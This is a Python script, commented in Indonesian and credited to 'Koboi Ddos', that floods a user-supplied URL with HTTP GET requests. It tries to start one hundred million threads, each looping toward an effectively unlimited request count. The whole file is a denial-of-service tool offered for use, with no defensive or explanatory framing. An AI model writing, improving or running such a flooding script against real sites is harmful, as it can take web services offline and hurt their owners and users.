import requests
import threading
import time
import os
import signal

# Informasi pengarang
author = "Koboi Ddos"

# Fungsi yang akan dijalankan oleh setiap thread
def make_request(url, batas_permintaan, exit_event):
    jumlah_permintaan = 0
    try:
        while not exit_event.is_set():
            if jumlah_permintaan >= batas_permintaan:
                print(f"Sudah mencapai batas {batas_permintaan} permintaan ke {url}")
                break
            
            response = requests.get(url)
            if response.status_code == 200:
                print(f"Permintaan ke {url} berhasil!")
            else:
                print(f"Gagal melakukan permintaan ke {url}")
            time.sleep(0.1)  # Interval waktu 0,1 detik
            jumlah_permintaan += 1
    except KeyboardInterrupt:
        print("Ctrl+C ditekan. Menghentikan permintaan...")
        exit_event.set()

# Minta pengguna memasukkan URL target
target_url = input("Masukkan URL target: ")

batas_permintaan = 999999999999999999999999999999999999999999999999999999999999999999999999999999  # Ganti dengan batas permintaan yang Anda inginkan

# Jumlah thread yang akan digunakan
jumlah_thread = 100000000

# Membuat dan menjalankan thread-thread
exit_event = threading.Event()
threads = []

for i in range(jumlah_thread):
    thread = threading.Thread(target=make_request, args=(target_url, batas_permintaan, exit_event))
    threads.append(thread)
    thread.start()

try:
    # Menunggu hingga semua thread selesai
    for thread in threads:
        thread.join()
except KeyboardInterrupt:
    print("Ctrl+C ditekan. Menghentikan semua thread...")

# Menampilkan informasi pengarang
print(f"Script ini ditulis oleh: {author}")
